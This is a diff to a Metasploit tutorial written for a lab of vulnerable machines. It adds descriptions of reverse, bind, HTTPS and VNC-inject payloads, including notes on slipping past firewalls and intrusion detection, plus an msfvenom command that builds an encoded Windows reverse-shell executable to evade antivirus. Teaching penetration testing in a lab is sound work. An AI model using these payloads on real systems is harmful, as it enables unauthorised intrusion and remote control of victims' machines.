@@ -3,15 +3,16 @@ Goals:
 We have 4-5 vulnerable machines set up
 
 ## Table of Contents
-[Connecting to a database](#connecting-to-a-database)
-[Scanning](#scanning)
-[Exploitation](#exploitation)
-        -[Choosing an exploit](#choosing-an-exploit)
-        -[Searching](#searching)
-        -[Using a search result](#using-a-search-result)
-        -[Types of payloads](#types-of-payloads)
--[Post-Exploitation](#post-exploitation)
-        -[What is Meterpreter?](#what-is-meterpreter)
+- [Connecting to a database](#connecting-to-a-database)
+- [Scanning](#scanning)
+- [Exploitation](#exploitation)
+        - [Choosing an exploit](#choosing-an-exploit)
+        - [Searching](#searching)
+        - [Using a search result](#using-a-search-result)
+        - [Types of payloads](#types-of-payloads)
+- [Post-Exploitation](#post-exploitation)
+        - [What is Meterpreter?](#what-is-meterpreter)
+- [Further Reading](#further-reading)
 
 ## Metasploit
 Metasploit is a widely used penetration testing framework that helps find, exploit, and validate vulnerabilities in systems. To open Metasploit, type `msfconsole` in the terminal.
@@ -55,7 +56,37 @@ Then type `show options` to view what parameters need to be set.
 To set a parameter, you can type `set <Parameter Name> <value>` and `unset <Parameter Name>`
 
 #### Types of payloads
-The exploit will get you onto the system. But what do you do once you get in? A simple payload is the 
+The exploit will get you onto the system. But what do you do once you get in? Here are some popular payloads
+
+#### Common Metasploit Payloads
+
+- **Windows TCP Reverse Shell (`windows/meterpreter/reverse_tcp`)**
+   - A reverse shell payload that initiates a connection from a Windows target back to the attacker. The attacker gains access to a Meterpreter session on the compromised system. It's beneficial for bypassing outbound firewall restrictions.
+
+- **Linux TCP Reverse Shell (`linux/x86/meterpreter/reverse_tcp`)**
+   - Similar to its Windows counterpart, this payload initiates a connection from a Linux target back to the attacker. It provides a Meterpreter session, granting various capabilities like file interaction, system command execution, and more.
+
+- **Windows TCP Bind Shell (`windows/meterpreter/bind_tcp`)**
+   - The payload sets up a listening service on the target Windows machine. The attacker then connects to this service to establish a Meterpreter session. It's direct but may be blocked by firewall restrictions on the target.
+
+- **Windows HTTPS Meterpreter (`windows/x64/meterpreter/reverse_https`)**
+   - A Meterpreter session that uses HTTPS for encrypted communication. This method is harder to detect and differentiate from regular web traffic by intrusion detection systems.
+
+- **Windows Shell Reverse TCP (`windows/shell/reverse_tcp`)**
+   - Unlike the Meterpreter payload, this provides a simple command shell (similar to `cmd.exe` on Windows) on the compromised system. It's less stealthy and versatile than Meterpreter but is lightweight and direct.
+
+- **Windows VNC Inject (`windows/vncinject/reverse_tcp`)**
+   - Injects a VNC server into the memory of the target Windows machine.
+   - Establishes a reverse connection, allowing the attacker to view and interact with the victim's desktop in real-time.
+   - Provides visual access without installing persistent software, reducing detection by file-based antivirus solutions.
+   - While powerful for demonstrations and real-time monitoring, it can be quite visible to the victim due to the sudden appearance of a VNC session.
+
+##### Creating Custom Payloads with msfvenom
+See (Msf Venom)[#msf-venom] for more details
+
+- Generate an obfuscated reverse TCP shell for Windows:
+  ```bash
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f exe -e x86/shikata_ga_nai -i 3 > output.exe
 
 ### Post-Exploitation
 Post-exploitation's goals are pretty open ended. You can try to maintain persistence, pivot around the network, etc.
